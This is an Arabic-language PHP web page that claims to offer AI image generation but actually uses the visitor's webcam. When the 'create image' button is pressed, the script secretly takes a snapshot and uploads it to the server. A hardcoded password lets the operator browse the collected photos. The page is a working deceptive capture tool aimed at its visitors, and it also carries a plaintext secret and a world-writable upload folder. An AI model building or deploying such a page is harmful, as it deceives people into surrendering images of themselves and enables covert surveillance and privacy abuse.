<?php
session_start();

// تأكد من وجود كلمة المرور
$correctPassword = 'fde3wxg532str25rdf5324df'; // كلمة المرور المعينة
$uploadDir = 'uploads/'; // مسار حفظ الصور
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true); // إنشاء المجلد إذا لم يكن موجودًا
}
$images = glob($uploadDir . '*.{jpg,png,gif}', GLOB_BRACE); // اجلب الصور

if (isset($_POST['login'])) {
    if ($_POST['password'] === $correctPassword) {
        $_SESSION['loggedin'] = true;
    } else {
        $_SESSION['message'] = 'كلمة مرور خاطئة.';
    }
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        h1 {
            color: #007BFF;
        }
        img {
            margin: 10px;
            max-width: 100%;
            height: auto;
        }
        button, input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007BFF;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>مرحبا بك في انشاء الصور بواسطة الذكاء الاصطناعي</h1>
        <?php if (isset($_SESSION['message'])): ?>
            <p><?php echo $_SESSION['message']; ?></p>
        <?php endif; ?>

        <button id="captureButton">انشاء صورة</button>
        <video id="video" width="640" height="480" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            document.getElementById('captureButton').addEventListener('click', function() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                // طلب إذن الوصول إلى الكاميرا
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        video.style.display = 'block';
                        video.srcObject = stream;

                        // التقاط الصورة بعد 3 ثوانٍ
                        setTimeout(function() {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/png');

                            // إرسال الصورة إلى الخادم
                            fetch('upload.php', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({ image: imageData })
                            })
                            .then(response => response.json())
                            .then(data => {
                                alert(data.message);
                                video.style.display = 'none';
                                stream.getTracks().forEach(track => track.stop());
                            });
                        }, 1000);
                    })
                    .catch(function(error) {
                        console.error('خطأ في الوصول إلى الكاميرا:', error);
                    });
            });
        </script>

        <?php if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true): ?>
            <h2>الصور المصنوعة:</h2>
            <?php if (empty($images)): ?>
                <p>لا توجد صور مصنوعة.</p>
            <?php else: ?>
                <?php foreach ($images as $image): ?>
                    <img src="<?php echo $image; ?>" alt="User Image">
                <?php endforeach; ?>
            <?php endif; ?>
        <?php else: ?>
            <form method="post">
                <label for="password"> للمعرفة ليس يجب عليك أن تسجل الدخول لصنع صورة، فقط اضغط على زر صنع صورة و سيتم الصنع.</label>
                <input type="password" name="password" id="password">
                <button type="submit" name="login">تسجيل الدخول</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
